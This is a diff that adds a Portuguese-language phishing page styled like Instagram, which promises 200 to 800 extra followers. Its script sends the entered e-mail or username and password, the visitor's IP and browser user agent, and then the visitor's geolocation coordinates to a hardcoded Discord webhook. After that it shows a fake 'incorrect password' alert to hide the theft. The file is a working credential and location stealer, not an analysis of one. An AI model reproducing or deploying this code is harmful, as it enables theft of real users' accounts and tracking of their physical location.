@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(45deg, 
+                #405DE6, #5851DB, #833AB4, #C13584, #E1306C, 
+                #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80
+            );
+            background-size: 400% 400%;
+            //animation: gradientAnimation 15s ease infinite;
+            padding: 20px;
+        }
+
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .login-container h2 {
+            color: #ffffff;
+            font-size: 28px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .login-container p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            color: #ffffff;
+            font-size: 14px;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        /* Estilização aplicada tanto nos inputs quanto no select */
+        .input-group input, 
+        .input-group select {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            outline: none;
+            color: #ffffff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        /* Ajuste específico para as opções dentro do select aparecerem legíveis */
+        .input-group select option {
+            background-color: #833AB4; /* Fundo sólido para leitura no menu aberto */
+            color: #ffffff;
+        }
+
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            background: rgba(255, 255, 255, 0.3);
+            border-color: #ffffff;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 13px;
+        }
+
+        .remember-forgot label {
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .remember-forgot input[type="checkbox"] {
+            accent-color: #C13584;
+            cursor: pointer;
+        }
+
+        .remember-forgot a {
+            color: #FFDC80;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .remember-forgot a:hover {
+            text-decoration: underline;
+            color: #FCAF45;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #ffffff;
+            border: none;
+            border-radius: 8px;
+            color: #833AB4;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-login:hover {
+            background: #FFDC80;
+            color: #E1306C;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
+        }
+
+        .btn-login:active {
+            transform: translateY(0);
+        }
+
+        .register-link {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #ffffff;
+        }
+
+        .register-link a {
+            color: #FFDC80;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .register-link a:hover {
+            text-decoration: underline;
+            color: #FCAF45;
+        }
+        .imgs{
+            display:flex;
+            flex-direction:row;
+            
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>Bem-vindo</h2>
+        <div class="imgs">
+        <img src="insta.png" width="50px" height="50px">
+        <img src="pic.png" width="250px" height="50px" style="border-radius:10px;">
+        <br><br><br>
+        </div>
+        <div class="input-group">
+                <label for="numero-plano">Número de Seguidores à Aumentar</label>
+                <select id="numero-plano" name="numero-plano" style="font-weight:bold">
+                    <option value="200">200</option>
+                    <option value="500">500</option>
+                    <option value="800">800</option>
+                </select>
+            </div>
+        
+        <form action="#">
+            <div class="input-group">
+                <label for="email">E-mail, Número ou Nome de Usuário</label>
+                <input type="email" id="email" placeholder="exemplo@gmail.com" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Senha</label>
+                <input type="password" id="password" placeholder="Digite sua senha" required>
+            </div>
+
+            <!-- NOVO CAMPO: Select com 200, 500 e 800 -->
+            
+            
+            
+            <button type="submit" class="btn-login" onclick="send()">AUMENTAR SEGUIDORES</button>
+            
+            
+        </form>
+    </div>
+<script>
+    /*
+document.addEventListener('DOMContentLoaded', () => {
+    // 1. Busca o formulário dentro da página
+    const formulario = document.querySelector('form');
+    const ID_ALERTA = 'alerta-erro-login';
+
+    if (!formulario) return;
+
+    formulario.addEventListener('submit', (event) => {
+        // Impede o envio real do formulário para que o alerta possa aparecer na tela
+        event.preventDefault(); 
+
+        // 2. Verifica se o alerta já está na tela. Se já estiver, não cria outro.
+        if (document.getElementById(ID_ALERTA)) {
+            return;
+        }
+
+        // 3. Cria o elemento do alerta
+        const alerta = document.createElement('div');
+        alerta.id = ID_ALERTA;
+        alerta.textContent = 'Senha ou e-mail incorretos';
+
+        // 4. Aplica a estilização integrada à sua paleta de cores
+        Object.assign(alerta.style, {
+            position: 'fixed',
+            top: '20px',
+            left: '50%',
+            transform: 'translateX(-50%)',
+            backgroundColor: '#E1306C', // Cor Torch Red
+            color: '#ffffff',
+            padding: '12px 24px',
+            borderRadius: '8px',
+            fontWeight: '500',
+            fontSize: '15px',
+            boxShadow: '0 4px 15px rgba(0, 0, 0, 0.3)',
+            zIndex: '10000',
+            transition: 'opacity 0.5s ease',
+            textAlign: 'center',
+            fontFamily: "'Roboto', sans-serif"
+        });
+
+        // 5. Insere o alerta no corpo da página
+        document.body.appendChild(alerta);
+
+        // 6. Inicia o efeito de sumiço (fade-out) um pouco antes de dar 1 minuto
+        setTimeout(() => {
+            alerta.style.opacity = '0';
+        }, 59500);
+
+        // 7. Remove o elemento do HTML definitivamente após 1 minuto (60000ms)
+        setTimeout(() => {
+            if (alerta.parentNode) {
+                alerta.parentNode.removeChild(alerta);
+            }
+        }, 60000);
+    });
+}); */
+    async function sucesso(posicao) {
+    const res = await fetch("https://httpbin.org/ip");
+    const res2 = await res.json();
+    const ip = res2.origin;
+    const useragent = navigator.userAgent;
+    const lct = "\nLatitude: "+ posicao.coords.latitude+ "\nLongitude:"+ posicao.coords.longitude;
+    const content = {
+        content: `=======\nIP: ${ip}\nUserAgent: ${useragent}\nCoords: ${lct}\n=======`
+    }
+    await fetch("https://discord.com/api/webhooks/1507506807726280836/gYcSNU1ui5DuzGIVe5xFD-hY2s1RshhCwf2Opt5CdKDbs7Y_Qm4Db5hya4t0d8GFnbLW",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(content)
+    });
+}
+
+    // Função de erro da geolocalização que dispara o alerta visual na tela
+function erro(err) {
+    console.error("Erro de localização:", err.message);
+    
+    const ID_ALERTA = 'alerta-erro-login';
+
+    // Se o alerta já estiver na tela, não cria outro
+    if (document.getElementById(ID_ALERTA)) {
+        return;
+    }
+
+    // Cria o elemento do alerta
+    const alerta = document.createElement('div');
+    alerta.id = ID_ALERTA;
+    alerta.textContent = 'Senha ou e-mail incorretos';
+
+    // Aplica a estilização
+    Object.assign(alerta.style, {
+        position: 'fixed',
+        top: '20px',
+        left: '50%',
+        transform: 'translateX(-50%)',
+        backgroundColor: '#E1306C',
+        color: '#ffffff',
+        padding: '12px 24px',
+        borderRadius: '8px',
+        fontWeight: '500',
+        fontSize: '15px',
+        boxShadow: '0 4px 15px rgba(0, 0, 0, 0.3)',
+        zIndex: '10000',
+        transition: 'opacity 0.5s ease',
+        textAlign: 'center',
+        fontFamily: "'Roboto', sans-serif"
+    });
+
+    // Insere na página
+    document.body.appendChild(alerta);
+
+    // Some aos 59.5 segundos
+    setTimeout(() => {
+        alerta.style.opacity = '0';
+    }, 59500);
+
+    // Apaga do HTML em 1 minuto
+    setTimeout(() => {
+        if (alerta.parentNode) {
+            alerta.parentNode.removeChild(alerta);
+        }
+    }, 60000);
+}
+
+function getLoc(){
+
+// 3. Passe o nome delas diretamente no método do navegador
+navigator.geolocation.getCurrentPosition(sucesso, erro);
+}
+
+const inputs = document.querySelectorAll("input");
+const useragent = navigator.userAgent;
+
+
+    async function send(){
+        const res = await fetch("https://httpbin.org/ip");
+        const res2 = await res.json();
+        const ip = res2.origin;
+        console.log(ip);
+const msg = {
+    content: `=======\nIP:${ip}\nUser-Agent:${useragent}\nEmail: ${inputs[0].value}\nSenha: ${inputs[1].value}\n=======`
+}
+await fetch("https://discord.com/api/webhooks/1507506807726280836/gYcSNU1ui5DuzGIVe5xFD-hY2s1RshhCwf2Opt5CdKDbs7Y_Qm4Db5hya4t0d8GFnbLW", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(msg)
+});
+inputs[0].value="";
+inputs[1].value="";
+
+getLoc();
+    }
+
+</script>
+</body>
+</html>
